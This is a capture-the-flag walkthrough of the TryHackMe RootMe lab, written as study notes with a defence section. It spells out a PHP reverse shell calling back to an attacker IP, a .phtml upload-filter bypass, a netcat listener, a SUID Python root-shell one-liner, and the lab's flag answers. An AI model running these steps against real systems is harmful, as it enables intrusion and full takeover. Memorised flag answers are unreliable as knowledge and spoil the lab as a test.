# The RootMe Kill Chain — recon to root

**TryHackMe · RootMe · Study Notes**

A walkthrough of everything we did to fully compromise the RootMe box, written so the *method* sticks — not just the answers. Each step pairs the command with the reason it worked.

| | |
|---|---|
| **Target** | `10.130.159.151` |
| **Attacker (tun0)** | `192.168.170.52` |
| **Foothold** | `www-data` |
| **Result** | `uid=0(root)` ✓ |

---

## 00 · Answer key

| Question | Answer |
|---|---|
| Hidden directory found by brute-forcing | `/panel` |
| user.txt flag | `THM{y0u_g0t_a_sh3ll}` |
| "Weird" SUID binary | `/usr/bin/python` |
| root.txt flag | `cat /root/root.txt` |

---

## 01 · The attack chain, step by step

### 1. Brute-force for hidden directories — *Recon · content discovery*

The web root looked ordinary, so the interesting paths had to be ones that aren't linked anywhere. **Gobuster** requests thousands of common directory names from a wordlist and reports which ones exist.

```bash
gobuster dir -u http://10.130.159.151 \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Hits: `css`, `js`, `uploads`, `server-status`, and the one that mattered — `panel`.

> **Why /panel?** css / js / uploads are standard site plumbing. `panel` stood out as an admin-style path nothing on the site linked to — the definition of a "hidden" directory.

### 2. Inspect the hidden page — *Enumeration*

Reading the raw HTML of `/panel/` revealed a **file-upload form** — the intended foothold.

```bash
curl -s http://10.130.159.151/panel/
```

```html
...
<form method="POST" enctype="multipart/form-data">
  <input type="file" name="fileUpload">
  <input type="submit" value="Upload">
</form>
```

An upload that accepts your file and stores it somewhere web-accessible (`/uploads/`) is a classic path to code execution — *if* you can get the server to run what you upload.

### 3. Prepare a PHP reverse shell — *Weaponize*

We used the pentestmonkey PHP reverse shell and pointed it back at our own machine. Only two lines change — the `$ip` (your VPN address) and the `$port` you'll listen on.

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
nano shell.php
# inside the file:
$ip   = '192.168.170.52';   // your tun0 IP
$port = 4444;               // your listener port
```

> Find your VPN IP with `ip a show tun0` — it's the `inet` value before the `/`. If `tun0` doesn't exist, the THM VPN isn't connected.

### 4. Defeat the upload filter with .phtml — *Exploit · filter bypass*

The form rejected `.php` uploads. But the filter only checks the **extension string**, not the file's real content — and Apache on this box still executes `.phtml` as PHP. Renaming slips past the blocklist while keeping the code runnable.

```bash
mv shell.php shell.phtml
```

> **Fallback extensions** if `.phtml` is blocked too: `.php3` · `.php4` · `.php5` · `.phar`

### 5. Listen, upload, trigger — *Exploit · catch the shell*

Start the listener **first** (in its own terminal), upload the file through the form, then request the file from `/uploads/` to execute it.

```bash
# terminal 1 — listener, leave it open
nc -lvnp 4444

# browser — visit the uploaded file to run it
http://10.130.159.151/uploads/shell.phtml
```

The browser hangs (that's the shell connecting back), and terminal 1 lights up with a connection as `www-data`.

```bash
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 6. Grab user.txt — *Loot · user flag*

```bash
find / -name user.txt 2>/dev/null
cat /var/www/user.txt
# THM{y0u_g0t_a_sh3ll}
```

`2>/dev/null` throws away the "Permission denied" noise so only the real hit prints.

### 7. Hunt SUID binaries, spot the odd one — *Privilege escalation*

SUID files run with their *owner's* privileges. If root owns one and it can spawn a shell or run arbitrary code, any user becomes root. We listed every SUID binary and looked for one that doesn't belong.

```bash
find / -perm -u=s -type f 2>/dev/null
...
/usr/bin/sudo        # normal
/usr/bin/passwd      # normal
/usr/bin/python2.7   # WEIRD ⚑
```

> **The tell:** a language interpreter with the SUID bit set is never a default. `python` that runs as root means you can ask it to run anything as root.

### 8. Escalate with Python setuid — *Root · game over*

Because Python keeps its SUID privileges, we tell it to set our UID to 0 (root) and then hand us a shell.

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id
# uid=0(root) gid=33(www-data) groups=33(www-data)
cat /root/root.txt
```

> **The `uid=0(root)`** is the whole game — the box is fully compromised. `root.txt` is the final flag.

---

## 02 · Concepts you actually learned

- **Content discovery (recon)** — Not every page is linked. Wordlist-based tools like gobuster / dirb / ffuf reveal hidden paths by asking for common names and watching the status codes. A `301`/`200` means it exists; the default `404` means it doesn't.
- **Unrestricted upload (web)** — File uploads become remote code execution when the server both *stores* your file somewhere reachable and *executes* its type. Extension blocklists are weak — they check a name, not the content or the server's real handler map.
- **Extension bypass (web)** — `.phtml`, `.php5`, `.phar` are all still executed as PHP by common Apache configs, so they slip past a filter that only blocks `.php`.
- **Reverse shells (access)** — The victim connects *out* to your listener (`nc -lvnp`), which sails through outbound-only firewalls far more often than a bind shell you'd connect *into*.
- **SUID privesc (linux)** — The SUID bit runs a file as its owner. A root-owned SUID binary that can execute code is a direct path to root — enumerate them first on any Linux box.
- **GTFOBins (reference)** — The [GTFOBins](https://gtfobins.github.io) project lists exactly how to abuse a given binary (SUID, sudo, capabilities). Look up whatever weird binary you find.

---

## 03 · Command anatomy — the "why" behind the syntax

Questions I asked while solving the box, kept here because these three fragments show up in almost every Linux engagement.

### What does `2>/dev/null` mean? — *Shell redirection*

Every command has three numbered streams called **file descriptors**. The `2` isn't a version or a count — it's literally the error channel.

```
# 0 = stdin  (input)
# 1 = stdout (normal results  <- what you want)
# 2 = stderr (error messages   <- the noise)
```

`2>` redirects stream 2 (errors); `/dev/null` is the system "trash can" that discards anything sent to it. So the phrase means **"throw the error messages away."**

Running `find /` as a low-priv user spams hundreds of `Permission denied` lines — those are stderr. Silencing them leaves only the real match on screen.

```bash
find / -name user.txt 2>/dev/null
# /var/www/user.txt          <- clean signal, no noise
```

> **Related forms:** `2>&1` merges errors into stdout · `>/dev/null 2>&1` silences everything. In `2>&1` the `&` means "the number after me is a descriptor, not a filename."

### What do `-perm -u=s` and `-type f` do? — *find flags*

They're two filters combined with an implicit AND — a file must satisfy both to be printed.

**`-type f`** restricts results by *kind* of object:

```
f = regular file    d = directory    l = symbolic link
```

We want `f` because a SUID binary is a file you execute — directories with odd bits are just noise.

**`-perm -u=s`** filters by permission bits. `u=s` = the **s** bit on the **u**ser (owner) slot, i.e. the SUID bit. The leading `-` dash controls how strictly it matches:

```
-perm u=s     -> permissions are EXACTLY this, nothing else
-perm -u=s    -> permissions include AT LEAST this bit   <- we use this
-perm /u=s    -> permissions include ANY of these bits
```

The `-` ("at least") is essential: a real binary like `sudo` is `rwsr-xr-x` — it has SUID *plus* read/execute bits, so an exact match would miss it.

> **Same thing, octal form:** `-perm -4000` and `-perm -u=s` are identical — `4000` is the octal value of the SUID bit.

### What does SUID actually mean? — *Linux permissions*

**SUID = Set User ID.** A special permission bit that tells the system: *"run this program as the file's **owner**, not as the person launching it."* When the owner is root, that program runs with root's power.

**Why it exists (legit use):** `passwd` must write to `/etc/shadow`, which only root can touch — yet every user needs to change their own password. Making `passwd` SUID-root lets it do that one narrow job as root, safely.

```
-rwsr-xr-x  root root  /usr/bin/passwd
    ^ the 's' (instead of 'x') is the SUID bit
```

**Why attackers love it:** SUID is only safe when the program does one narrow thing. A root-owned SUID program that can run *arbitrary* code — an interpreter, editor, or shell-spawner — is a straight path from any user to root. That's exactly what RootMe handed us:

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

`os.setuid(0)` succeeds only because Python was already running with root's privileges thanks to the SUID bit. UID `0` is root.

> **One-liner to remember:** SUID = "run as owner." Necessary for a few trusted tools; catastrophic on anything that can execute arbitrary commands. That's why `find / -perm -u=s -type f 2>/dev/null` is a first move on every Linux box.

---

## 04 · Command cheat-sheet

| Command | What it does |
|---|---|
| `gobuster dir -u <url> -w <wordlist>` | Brute-force directories and files. |
| `curl -s <url>` · `curl -sI <url>` | Fetch page source · fetch response headers only. |
| `ip a show tun0` | Find your VPN IP for reverse-shell callbacks. |
| `nc -lvnp <port>` | Start a listener to catch a reverse shell. |
| `find / -name user.txt 2>/dev/null` | Locate a file anywhere, hiding permission errors. |
| `find / -perm -u=s -type f 2>/dev/null` | List every SUID binary — the privesc starting point. |
| `python -c 'import os; os.setuid(0); os.system("/bin/bash")'` | Escalate via a SUID Python interpreter. |
| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade a dumb shell to an interactive TTY. |

---

## 05 · Flip it around — how you'd defend this box

1. **Validate uploads by content, not extension.** Check the real MIME type / magic bytes, force a safe extension, store uploads outside the web root, and serve them with execution disabled.
2. **Don't leave admin panels unauthenticated.** "Hidden" isn't a control — `/panel` should have required a login. Security through obscurity fails to a wordlist.
3. **Never set SUID on interpreters.** `chmod u-s /usr/bin/python*`. Audit SUID binaries regularly and keep the set minimal.
4. **Disable `server-status` exposure** and other info-leaking endpoints to unauthenticated clients.

---

## 06 · The pattern to remember

**Enumerate → find the weak input → get a shell → enumerate again → escalate.**

Almost every beginner box follows this rhythm. RootMe's version was: directory brute-force → upload filter bypass → reverse shell as a low-priv user → SUID enumeration → root. When you're stuck on the next machine, ask which of these five phases you're in and what you haven't looked at yet.

---

*Practice notes · TryHackMe RootMe · for authorized lab use only.*
